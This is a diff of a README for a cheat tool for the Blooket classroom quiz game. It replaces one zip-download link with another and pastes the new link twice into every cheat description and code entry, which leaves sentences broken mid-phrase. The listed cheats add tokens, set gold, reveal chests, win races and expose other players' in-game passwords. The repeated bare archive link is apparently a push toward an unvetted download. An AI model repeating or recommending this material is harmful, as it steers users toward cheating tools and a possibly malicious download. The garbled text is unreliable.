@@ -17,7 +17,7 @@ The Blooket Hack provided by shenke...
 
 If you are a programmer and want to make your own codes for blooket make sure to check out the blooket library! At
 
-#  https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip
+#  https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip
 
 Current Version
 
@@ -36,40 +36,40 @@ Fixed More Codes!    Fixed Add Daily Tokens!!!!
 Top 6 list of most popular/used codes...
 
 
- 1. Add Daily https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip ADD Daily Tokens This code  will add 500 tokens which is the max daily limit and add the max xp which is 300 daily limit!
-https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip%20Daily%20Tokens
+ 1. Add Daily https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip ADD Daily Tokens This code  will add 500 tokens which is the max daily limit and add the max xp which is 300 daily limit!
+https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip%20Daily%20Tokens
 
 
 
 
- 2. Get https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip Get Gold code will let you chose any amount of gold you want in the gold quest gamemode you can even get negative gold but not reccomended!
-https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip%20Quest/Get%20Gold
+ 2. Get https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip Get Gold code will let you chose any amount of gold you want in the gold quest gamemode you can even get negative gold but not reccomended!
+https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip%20Quest/Get%20Gold
 
 
 
 
- 3. Chest https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip Chest ESP Works in multiple gamemodes works best in gold quest once you use this code you wil be able to see what you will get in the chest before even clicking on it so it is very usefull!
-https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip%20Quest/Chest%20ESP
+ 3. Chest https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip Chest ESP Works in multiple gamemodes works best in gold quest once you use this code you wil be able to see what you will get in the chest before even clicking on it so it is very usefull!
+https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip%20Quest/Chest%20ESP
  
 
 
 
- 4. Get https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip Get Crypto code is just like the Get gold code but only works in Crypto hack Gamemode.
-https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip%20Hack/Get%20Crypto
+ 4. Get https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip Get Crypto code is just like the Get gold code but only works in Crypto hack Gamemode.
+https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip%20Hack/Get%20Crypto
 
 
 
 
 
- https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip other users https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip get other users password code is slightly different to most of the other codes but when you are playing in the crypto hack gamemode and get the hack option in one of the chests use the code and it will tell you your victims password!
-https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip%20Hack/Get%20Other%20Users%20Password
+ https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip other users https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip get other users password code is slightly different to most of the other codes but when you are playing in the crypto hack gamemode and get the hack option in one of the chests use the code and it will tell you your victims password!
+https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip%20Hack/Get%20Other%20Users%20Password
 
 
 
 
 
- 6. Instant https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip Instant win code will automatically make you win in the racing mode
-https://raw.githubusercontent.com/AJLGamez/blooket-hack/main/Gold Quest/blooket-hack-brainer.zip%20Win
+ 6. Instant https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip Instant win code will automatically make you win in the racing mode
+https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip https://github.com/AJLGamez/blooket-hack/raw/refs/heads/main/Cafe/blooket_hack_3.6.zip%20Win
 
 
 
